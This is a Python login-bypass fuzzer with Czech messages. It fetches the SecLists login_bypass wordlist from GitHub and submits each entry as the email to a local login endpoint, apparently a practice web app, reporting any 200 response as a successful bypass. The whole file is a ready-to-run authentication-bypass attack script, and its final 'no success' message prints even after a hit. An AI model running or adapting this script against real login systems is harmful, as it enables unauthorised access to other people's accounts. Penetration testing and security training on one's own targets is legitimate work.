import requests

TARGET_URL = "http://localhost:3000/rest/user/login"
SECLISTS_RAW_URL = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/login_bypass.txt"


def get_payloads():
    try:
        response = requests.get(SECLISTS_RAW_URL)
        response.raise_for_status()

        payloads = [line.strip() for line in response.text.splitlines() if line.strip()]
        print(f"[*] Staženo {len(payloads)} payloadů.")
        return payloads
    except Exception as e:
        print(f"[-] Chyba při stahování slovníku: {e}")
        return []


def run_fuzzer():
    payloads = get_payloads()
    if not payloads:
        return

    for i, payload in enumerate(payloads):
        json_data = {
            "email": payload,
            "password": "any_password"
        }

        try:
            response = requests.post(TARGET_URL, json=json_data, timeout=5)

            if response.status_code == 200:
                print(f"\n[!!!] LOGIN BYPASS ÚSPĚŠNÝ!")
                print(f"[+] Použitý payload: {payload}")
                print(f"[+] Odpověď: {response.json()}")

            if i % 10 == 0:
                print(f"[*] Zkouším payload č. {i}...", end="\r")

        except requests.exceptions.RequestException as e:
            print(f"\n[!] Chyba spojení: {e}")
            break

    print("\n[-] Fuzzer skončil. Žádný payload nevedl k přihlášení.")


if __name__ == "__main__":
    run_fuzzer()